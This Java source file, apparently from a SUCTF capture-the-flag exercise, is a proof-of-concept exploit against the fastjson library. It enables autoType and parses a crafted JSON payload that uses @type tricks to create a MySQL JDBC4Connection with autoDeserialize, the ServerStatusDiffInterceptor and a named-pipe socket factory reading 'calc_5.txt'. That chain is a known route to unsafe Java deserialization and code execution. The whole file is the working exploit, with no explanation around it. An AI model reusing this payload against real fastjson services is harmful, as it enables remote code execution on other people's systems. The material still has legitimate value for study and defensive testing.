package com.suctf;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;


public class Fastjson_mysql_calc_5 {
    public static void main(String[] args) {
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String mysql5poc = "{\n" +
                "  \"x1\": {\n" +
                "    \"@type\": \"java.lang.AutoCloseable\",\n" +
                "    \"@type\": \"com.mysql.jdbc.JDBC4Connection\",\n" +
                "    \"hostToConnectTo\": \"127.0.0.1\",\n" +
                "    \"portToConnectTo\": 3306,\n" +
                "    \"info\": {\n" +
                "      \"useSSL\": \"false\",\n" +
                "      \"user\": \"mysql\",\n" +
                "      \"HOST\": \"xxx\",\n" +
                "      \"statementInterceptors\": \"com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor\",\n" +
                "      \"autoDeserialize\": \"true\",\n" +
                "      \"NUM_HOSTS\": \"1\",\n" +
                "      \"socketFactory\": \"com.mysql.jdbc.NamedPipeSocketFactory\",\n" +
                "      \"namedPipePath\": \"calc_5.txt\",\n" +
                "      \"DBNAME\": \"test\"\n" +
                "    },\n" +
                "    \"databaseToConnectTo\": \"test\",\n" +
                "    \"url\": \"\"\n" +
                "  }\n" +
                "}\n";
        JSON.parseObject(mysql5poc);
    }
}
